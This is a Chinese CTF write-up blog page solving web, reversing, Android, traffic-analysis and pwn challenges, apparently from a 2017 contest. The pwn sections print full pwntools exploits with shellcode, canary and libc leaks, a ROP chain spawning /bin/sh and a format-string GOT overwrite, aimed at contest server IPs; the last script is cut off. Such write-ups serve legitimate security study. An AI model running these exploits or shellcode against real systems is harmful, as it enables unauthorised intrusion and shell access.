class="headerlink" title="Web 150 random"></a>Web 150 random</h2><p>一开始发现的是.index.php.swp也是会被服务器解析为php的，就看不到源代码。。<br>后面更新题目才可以泄露出源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">"*********************"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input a rand_num !"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length =  <span class="number">10</span>)</span></span>&#123;</span><br><span class="line">$randpwd = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)&#123;</span><br><span class="line">$randpwd .= chr(mt_rand(<span class="number">100</span>, <span class="number">200</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $randpwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">mt_srand(time());</span><br><span class="line"></span><br><span class="line">$pwd=create_password();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $pwd.<span class="string">'||'</span>;    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pwd == $_GET[<span class="string">'pwd'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"first"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'userLogin'</span>]==$_GET[<span class="string">'login'</span>])</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Nice , you get the flag it is "</span>.$flag ;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'userLogin'</span>]=create_password(<span class="number">32</span>).rand();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>绕过分两步：<br>step 1：<br>发现短时间内的pwd是相同的，所以可以脚本取pwd再发回去<br>step 2:<br>cookie为空，则$_SESSION[‘userLogin’]为空</p><p>写脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">"123"</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">r1 = requests.get(url=<span class="string">"http://114.215.138.89:10080/index.php?pwd="</span>+urllib.quote(code)+<span class="string">"&amp;login="</span>,cookies=&#123;&#125;)</span><br><span class="line">print(r1.content)</span><br><span class="line">first = r1.content.find(<span class="string">'!&lt;br&gt;'</span>)</span><br><span class="line">end = r1.content.find(<span class="string">'|'</span>)</span><br><span class="line">print(<span class="string">"%d-%d"</span>%(first,end))</span><br><span class="line">code = r1.content[first+<span class="number">5</span>:end]</span><br><span class="line">print(code)</span><br></pre></td></tr></table></figure></p><p><img src="/img/hxb2017/2.png" alt="2"></p><h2 id="Web-200-简简单单的上传，没有套路"><a href="#Web-200-简简单单的上传，没有套路" class="headerlink" title="Web 200 简简单单的上传，没有套路"></a>Web 200 简简单单的上传，没有套路</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.190.87.135:10080/?op=show&amp;imagekey=485dd90e2cb03e779646a2f1ae405734df4399a7</span><br></pre></td></tr></table></figure><p>又发现有/show.php<br>猜测op是文件包含<br><img src="/img/hxb2017/5.png" alt="5"><br>然后又发现只验证了Content-Type: image/png，可以轻易绕过<br><img src="/img/hxb2017/6.png" alt="6"></p><p><img src="/img/hxb2017/7.png" alt="7"></p><h2 id="简单android"><a href="#简单android" class="headerlink" title="简单android"></a>简单android</h2><p>jd-gui get flag …….</p><p><img src="/img/hxb2017/8.png" alt="8"></p><h2 id="Encryptor-apk"><a href="#Encryptor-apk" class="headerlink" title="Encryptor.apk"></a>Encryptor.apk</h2><p>题目给了一个flag.encryption 和一个apk<br>主要逻辑是传入一个图片文件还有一个key，然后按照传入的key的长度一组将image分组和key异或，结果保存<br>在一个固定的目录下，apk打开的时候默认有一个key之间将加密后的flag.encryption传进去再异或一遍<br>getflag,， 只想吐槽这出题人的书法水平。</p><p><img src="/img/hxb2017/9.png" alt="9"><br><img src="/img/hxb2017/10.png" alt="10"></p><h2 id="Re4newer"><a href="#Re4newer" class="headerlink" title="Re4newer"></a>Re4newer</h2><p>一个exe文件，加了upx壳，脱一下然后ida打开看看<br>主要逻辑如下<br><img src="/img/hxb2017/11.png" alt="11"></p><p>要求输入一个字符串，然后每位异或0x22 和写好的一段数字比较</p><p><img src="/img/hxb2017/12.png" alt="12"></p><p>直接将其抠出来，然后按照比较顺序异或一下0x22 即可<br>python 脚本如下</p><p><img src="/img/hxb2017/13.png" alt="13"></p><h2 id="Pwns"><a href="#Pwns" class="headerlink" title="Pwns"></a>Pwns</h2><p>一个无限循环，每次要求输入 Y/N ， N 退出，输入Y之后输入一段base64<br>字符串，然后程序将其解密之后输出出来，每次解密都是fork一个子进程来进行操作<br><img src="/img/hxb2017/14.png" alt="14"><br>程序可以输入0x200长度的base64字符串，base64解码之后放在一个 257 大小的数组里面，然后<br>0x200 base64 decode之后长度长于0x10d ,可造成栈溢出，因为程序开了canary,加上result用%s 输出，直接<br>覆盖泄漏canary，因为是子进程，崩溃之后不会影响主线程，可以继续循环操作，再次泄漏一次libc的地址，<br>然后覆盖返回地址为system(“/bin/sh”)即可<br><img src="/img/hxb2017/15.png" alt="15"><br>exp 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">shellcode_x86=<span class="string">"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">shellcode_x64=<span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">shellcode_x85_ascii=<span class="string">"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"</span></span><br><span class="line"><span class="comment">#nasm -f bin -o shell32 shell32.asm</span></span><br><span class="line"><span class="comment"># x64函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64', log_level='debug')</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"><span class="comment">#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span></span><br><span class="line"><span class="comment">#frame = SigreturnFrame()</span></span><br><span class="line"><span class="comment">#fmt    payload+="%&#123;&#125;c%1$hhn".format(str(0x100-0xfe+ord(one_gadget[i])))</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">"pwns"</span></span><br><span class="line">libc=<span class="string">"./libc.so.6"</span></span><br><span class="line">ip=<span class="string">"118.190.77.161"</span></span><br><span class="line">port=<span class="number">10080</span></span><br><span class="line">is_libc=<span class="number">1</span></span><br><span class="line">is_ip=<span class="number">1</span></span><br><span class="line">is_port=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary=ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_libc==<span class="number">1</span>):</span><br><span class="line">  libc_elf=ELF(libc)</span><br><span class="line">        sys_offset=libc_elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>==local:</span><br><span class="line">  <span class="keyword">if</span> is_libc==<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># p=remote('127.0.0.1',1000)</span></span><br><span class="line">    <span class="comment"># p=process(argv=[filename,],env=&#123;"LD_PRELOAD":"./libc"&#125;)</span></span><br><span class="line">    p=process(filename)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    p=process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="keyword">if</span> <span class="number">-1</span>==is_port:</span><br><span class="line">    p=remote(<span class="string">""</span>,<span class="number">10000</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=<span class="string">'1234567890qwertyuiopasdfghjklzxvbnmQWERTYUIOPASDFGHJKLZXCVBNM123'</span></span><br><span class="line">t=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">  t+=i*<span class="number">4</span></span><br><span class="line"><span class="keyword">print</span> t,len(t)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tt=<span class="string">'1'</span>+t+<span class="string">'1'</span></span><br><span class="line">tt=base64.b64encode(tt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> tt,len(tt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment"># print p.recv()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">' datas:'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(tt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=p.recv()</span><br><span class="line">data=p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'==========='</span></span><br><span class="line">canary=u32(data.split(<span class="string">'LLZZZZXXXXCCCCVVVVBBBBNNNNMMMM111122223333'</span>)[<span class="number">-1</span>][:<span class="number">4</span>])<span class="number">-0x31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> data.split(<span class="string">'LLZZZZXXXXCCCCVVVVBBBBNNNNMMMM111122223333'</span>)</span><br><span class="line">p.info(hex(canary))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">tt=<span class="string">'1'</span>+t</span><br><span class="line">tt+=<span class="string">'aaaa'</span>+<span class="string">'aaaa'</span>*<span class="number">11</span>+<span class="string">'aaaa'</span>*<span class="number">8</span></span><br><span class="line">tt=base64.b64encode(tt)</span><br><span class="line">p.recvuntil(<span class="string">' datas:'</span>)</span><br><span class="line"><span class="keyword">print</span> tt,len(tt)</span><br><span class="line">p.sendline(tt)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment"># print p.recv()</span></span><br><span class="line"><span class="comment"># print p.recv()</span></span><br><span class="line">data= p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'data===========&gt;'</span>,data</span><br><span class="line">leak=u32(data.split(<span class="string">'aaaa'</span>+<span class="string">'aaaa'</span>*<span class="number">11</span>+<span class="string">'aaaa'</span>*<span class="number">8</span>)[<span class="number">-1</span>][:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=leak<span class="number">-0xf3</span><span class="number">-0x19a00</span></span><br><span class="line"></span><br><span class="line">p.info(<span class="string">'aaaaaaa'</span>+hex(leak))</span><br><span class="line"></span><br><span class="line">p.info(<span class="string">'aaaaaaa'</span>+hex(libc_base))</span><br><span class="line">system_addr=libc_base+<span class="number">0x0040310</span></span><br><span class="line">bin_sh_addr=libc_base+<span class="number">0x162cec</span> </span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x401b3</span></span><br><span class="line"></span><br><span class="line">tt=<span class="string">'1'</span>+t</span><br><span class="line">tt+=p32(canary)+<span class="string">'aaaa'</span>*<span class="number">3</span>+p32(system_addr)+p32(system_addr)+p32(bin_sh_addr)</span><br><span class="line">tt=base64.b64encode(tt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">' datas:'</span>)</span><br><span class="line"><span class="keyword">print</span> tt,len(tt)</span><br><span class="line">p.sendline(tt)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Pwn3"><a href="#Pwn3" class="headerlink" title="Pwn3"></a>Pwn3</h2><p>程序输入一个 计算的次数，即后面的循环次数，之后可以进行输入次数次的 add,sub,mul,div,save 操作<br><img src="/img/hxb2017/16.png" alt="16"><br><img src="/img/hxb2017/17.png" alt="17"><br>可以看到 save的时候直接将之前计算的内容写到栈上，程序没有开canary，那么就相当于是一个直接溢出<br>写rop了，程序是静态编译的，所以直接使用 ropgadget 来生成getshell的chain即可<br>exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode_x86=<span class="string">"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">shellcode_x64=<span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">shellcode_x85_ascii=<span class="string">"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA"</span></span><br><span class="line"><span class="comment">#nasm -f bin -o shell32 shell32.asm</span></span><br><span class="line"><span class="comment"># x64函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64', log_level='debug')</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"><span class="comment">#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span></span><br><span class="line"><span class="comment">#frame = SigreturnFrame()</span></span><br><span class="line"><span class="comment">#fmt    payload+="%&#123;&#125;c%1$hhn".format(str(0x100-0xfe+ord(one_gadget[i])))</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">"pwn300"</span></span><br><span class="line">libc=<span class="string">"$libc"</span></span><br><span class="line">ip=<span class="string">"118.190.83.164"</span></span><br><span class="line">port=<span class="number">10080</span></span><br><span class="line">is_libc=<span class="number">0</span></span><br><span class="line">is_ip=<span class="number">1</span></span><br><span class="line">is_port=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary=ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_libc==<span class="number">1</span>):</span><br><span class="line">  libc_elf=ELF(libc)</span><br><span class="line">        sys_offset=libc_elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span>==local:</span><br><span class="line">  <span class="keyword">if</span> is_libc==<span class="number">1</span>:</span><br><span class="line">                p=process(argv=[filename,],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"$libc"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    p=process(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  <span class="keyword">if</span> <span class="number">-1</span>==is_port:</span><br><span class="line">    p=remote(<span class="string">""</span>,<span class="number">10000</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_gadget</span><span class="params">(addr)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">'the result'</span>)</span><br><span class="line">  p.sendline(<span class="string">'1'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'x:'</span>)</span><br><span class="line">  p.sendline(<span class="string">'0'</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'y'</span>)</span><br><span class="line">  p.sendline(str(addr))</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'100'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">  set_gadget(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">aaa=[</span><br><span class="line"><span class="number">0x0806ed0a</span>,</span><br><span class="line"><span class="number">0x080ea060</span>,</span><br><span class="line"><span class="number">0x080bb406</span>,</span><br><span class="line">int(<span class="string">'/bin'</span>[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>),<span class="number">16</span>),</span><br><span class="line"><span class="number">0x080a1dad</span>,</span><br><span class="line"><span class="number">0x0806ed0a</span>,</span><br><span class="line"><span class="number">0x080ea064</span>,</span><br><span class="line"><span class="number">0x080bb406</span>,</span><br><span class="line">int(<span class="string">'//sh'</span>[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>),<span class="number">16</span>),</span><br><span class="line"><span class="number">0x080a1dad</span>,</span><br><span class="line"><span class="number">0x0806ed0a</span>,</span><br><span class="line"><span class="number">0x080ea068</span>,</span><br><span class="line"><span class="number">0x08054730</span>,</span><br><span class="line"><span class="number">0x080a1dad</span>,</span><br><span class="line"><span class="number">0x080481c9</span>,</span><br><span class="line"><span class="number">0x080ea060</span>,</span><br><span class="line"><span class="number">0x0806ed31</span>,</span><br><span class="line"><span class="number">0x080ea068</span>,</span><br><span class="line"><span class="number">0x080ea060</span>,</span><br><span class="line"><span class="number">0x0806ed0a</span>,</span><br><span class="line"><span class="number">0x080ea068</span>,</span><br><span class="line"><span class="number">0x08054730</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x0807b75f</span>,</span><br><span class="line"><span class="number">0x08049781</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aaa:</span><br><span class="line">  set_gadget(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="comment"># 0x8048fa2</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>直接wireshark打开文件，文件-&gt;导出对象-&gt;导出HTTP对象<br>发现有flag.zip<br><img src="/img/hxb2017/18.png" alt="18"><br>解压缩发现有ce.txt，打开是一串数字<br><img src="/img/hxb2017/19.png" alt="19"><br>很像是像素点,但是不知道图片size<br>将非255和255分别用”=”和”#”来，记事本打开，调整最小字体，调整记事本框框的大小<br>得到如下图<br><img src="/img/hxb2017/20.png" alt="20"></p><h2 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn 200"></a>pwn 200</h2><p><img src="/img/hxb2017/21.png" alt="21"></p><p>格式化字符串题<br>思路：<br>leak address，第35个存放的就是libc_start_main，于是可以泄露出libc基址<br>overwrite atoi_got 为system地址<br><img src="/img/hxb2017/22.png" alt="22"><br>然后利用read输入/bin/sh就可以getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./pwne'</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">p=remote(<span class="string">'114.215.133.230'</span>,<span class="number">10080</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">atoi_got=<span class="number">0x0804a02c</span></span><br><span class="line">p.recvuntil(<span class="string">'WANT PLAY[Y/N]'</span>)</span><br><span class="line">p.sendline(<span class="string">'Y'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">4</span>+<span class="string">'-%35$p'</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'-'</span>)</span><br><span class="line">libc_base=int(p.recv()[<span class="number">0</span>:<span class="number">10</span>],<span class="number">16</span>)<span class="number">-0x19af3</span></span><br><span class="line">system=libc_base+libc.symbols[<span 